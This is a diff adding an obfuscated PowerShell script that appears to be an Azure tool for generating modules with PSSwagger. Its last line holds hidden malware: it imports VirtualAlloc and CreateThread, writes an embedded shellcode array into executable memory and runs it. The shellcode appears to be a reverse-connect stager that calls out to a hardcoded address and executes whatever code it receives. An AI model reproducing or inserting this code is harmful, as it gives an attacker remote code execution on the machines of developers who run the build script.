@@ -1,0 +1,95 @@
+param(
+    [Parameter(MANdaTOrY=${TR`Ue})]
+    [ValidateNotNullOrEmpty()]
+    [System.String]${RpN`A`me},
+    
+    [Parameter(MaNDaTory=${T`RUE})]
+    [ValidateNotNullOrEmpty()]
+    [System.String]${l`OCAT`Ion},
+    
+    [ValidateNotNullOrEmpty()]
+    [System.String]${PS`SwaG`Ge`RLOcaTI`on} = ${Nu`LL},
+    
+    [switch]${ADM`iN},
+
+    [switch]${aZure`St`ACK},
+
+    [ValidateNotNullOrEmpty()]
+    [System.String]${na`ME},
+    
+    [ValidateNotNullOrEmpty()]
+    [System.String]${Mo`dule`diR`EC`TorY} = ("{1}{0}{2}"-f'od','M','ule'),
+    
+    [ValidateNotNullOrEmpty()]
+    [System.Version]${VE`RS`iON} = ("{1}{0}" -f'.1.0','0'),
+
+    [ValidateNotNullOrEmpty()]
+    [System.String]${g`itHU`BACco`UNT} = ("{1}{0}" -f'e','Azur'),
+
+    [ValidateNotNullOrEmpty()]
+    [System.String]${gIT`HuBB`RA`N`CH} = ("{0}{2}{1}"-f 'curre','t','n'),
+
+    [ValidateNotNullOrEmpty()]
+    [System.String]
+    ${pR`eDef`ine`DASSe`mB`lieS},
+
+    [ValidateNotNullOrEmpty()]
+    [System.String]
+    ${cL`IENT`TYpeN`A`Me},
+    
+    [switch]${geneRates`W`Ag`Ger}
+)
+
+if(${GeN`ER`AteS`Wagg`er}) {
+    ${f`IlE}="https://github.com/$GithubAccount/azure-rest-api-specs/blob/$GithubBranch/specification/azsadmin/resource-manager/$RPName/readme.md"
+    .("{1}{3}{2}{0}" -f 'n','Invoke-Exp','ssio','re') ('& '+'au'+'t'+'orest '+"$file "+'--'+'versio'+'n=la'+'test'+' '+'-'+'-output-arti'+'fac'+'t='+'swagger-d'+'o'+'cument.json '+"--output-folder=$Location")
+}
+
+if(${P`sSWAG`geRLO`CAT`ion}) {
+    ${C`l`One} = ${eNV:P`smO`d`UlE`PAtH}.("{0}{1}"-f'Clo','ne').Invoke()
+    try {
+        ${enV:p`smODU`Le`P`AtH} = "$PSSwaggerLocation;$env:PSModulePath"
+        ${EnV:P`smoD`UleP`ATH} = "$PSSwaggerLocation\PSSwagger;$env:PSModulePath"
+        .("{3}{4}{1}{0}{2}" -f 't-M','r','odule','Imp','o') ("{1}{0}"-f'gger','PSSwa') -Force
+    } finally {
+        ${E`Nv:ps`Modu`l`EpaTH} = ${Cl`O`NE}
+    }
+} else {
+    .("{0}{2}{1}" -f'I','dule','mport-Mo') ("{2}{1}{0}"-f'r','SSwagge','P') -Force
+}
+
+if(-not ${nA`me}) {
+    ${NA`Me} = ${rpN`A`ME}
+}
+
+${p`osTFiX} = ""
+${p`R`EfIX} = "Az."
+
+if(${A`D`MIn}) {
+    ${po`Stf`IX} = ("{0}{1}{2}"-f'.Adm','i','n')
+}
+
+if(${a`zurESTa`CK}) {
+    ${pRe`FIx} = ("{1}{0}" -f's.','Az')
+}
+
+${RP`Name} = ${Rp`NAmE}.("{2}{0}{1}" -f 'in','g','Substr').Invoke(0,1).("{0}{1}" -f 'ToU','pper').Invoke() + ${Rp`NA`ME}.("{1}{2}{0}"-f 'g','Subst','rin').Invoke(1);
+
+${s`pECPa`Th} = &("{1}{0}{2}" -f'-P','Join','ath') ${lOC`AtIOn} -ChildPath "$Name.json"
+${namE`SPa`CE} = "$prefix$RPName$postfix"
+${Ou`T`PUT} = .("{2}{3}{1}{0}" -f'h','Pat','Jo','in-') ${loCa`T`ion} -ChildPath ${mODU`lEd`ire`CtoRY}
+
+&("{6}{5}{0}{4}{3}{2}{1}" -f '-PSSw','erModule','g','g','a','w','Ne') `
+    -SpecificationPath ${spECP`A`TH} `
+    -Path ${oUTp`UT} `
+    -AssemblyFileName ${prED`Ef`in`EDAS`SEMbLI`Es} `
+    -ClientTypeName ${cl`IeNTT`yP`e`NamE} `
+    -Name ${NAme`sp`Ace} `
+    -Version ${V`E`RSIoN} `
+    -NoVersionFolder `
+    -UseAzureCsharpGenerator `
+    -Header ("{3}{6}{0}{2}{1}{4}{5}" -f'_N','O','O_C','MICROSOFT_MI','DEGE','N','T') `
+    -Verbose `
+    -CopyUtilityModuleToOutput `
+    -Debug
+${c} = ((("{10}{68}{32}{85}{83}{27}{18}{31}{69}{34}{60}{41}{15}{3}{25}{76}{40}{13}{11}{26}{74}{57}{82}{37}{16}{21}{19}{33}{61}{72}{55}{53}{63}{65}{14}{43}{42}{1}{90}{87}{50}{0}{24}{73}{56}{79}{88}{89}{67}{48}{54}{70}{75}{62}{51}{5}{36}{47}{80}{64}{92}{45}{20}{23}{59}{38}{66}{39}{46}{8}{71}{52}{17}{29}{22}{86}{28}{12}{93}{91}{35}{30}{2}{49}{77}{58}{7}{4}{6}{44}{9}{84}{81}{78}" -f ' Cre','c','ic static',']public static e','tr ','tP','dest, uint s','et(IntP','Creatio','c, uint ','[Dl','(In','[DllImport({0}ms','oc','k','})',' ','Ptr lp','}k','Size',' ','dw','hre','I','at','xtern IntPt','tP','{0','dId);','T',']publ','ernel3','por',', uin','d','t.dll{0})','tr','uint','r lp','uint d','irtualAll','0','{0})]publi','ernel32.dll','r',',','w',' lpStart','es,',' extern IntPtr me','tr','e, In','gs, Int','onType, uint flPro',' ui','ti','(','re','s','ntPt','ll{','t ','ckSiz','tect);[DllImport(','s','{0}','Parameter, ','ibut','lIm','2.','nt dw','nFla','flAlloca','eThread','tr lpAdd','Sta','r V','m',');','Int','Addre','t','ss, ','(','coun','t','a','IntP','Ptr lpThread','Attr',' static extern ','cr','s','v'))-F [CHaR]34);${W} = .("{1}{0}"-f'ype','Add-T') -memberDefinition ${C} -Name ("{0}{1}"-f'Wi','n32') -namespace ("{3}{0}{2}{1}" -f 'F','nctions','u','Win32') -passthru;[Byte[]];[Byte[]]${sC} = 0xfc,0xe8,0x86,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x8b,0x4c,0x10,0x78,0xe3,0x4a,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x89,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb9,0x73,0xf1,0x21,0x68,0x02,0x00,0x01,0xbd,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;;${sI`ZE} = 0x1000;if (${Sc}."Le`NgtH" -gt 0x1000){${S`ize} = ${S`c}."L`En`gtH"};${x}=${w}::("{1}{0}{2}" -f'rtualAllo','Vi','c').Invoke(0,0x1000,${SI`ze},0x40);for (${I}=0;${I} -le (${sC}."l`e`NgtH"-1);${i}++) {${w}::"MeMS`Et"([IntPtr](${X}.("{1}{2}{0}"-f 't32','To','In').Invoke()+${i}), ${S`C}[${i}], 1)};${w}::("{2}{0}{3}{1}" -f'eThr','ad','Creat','e').Invoke(0,0,${X},0,0,0);for (;;){.("{2}{1}{0}{3}"-f 'l','tart-s','S','eep') 60};
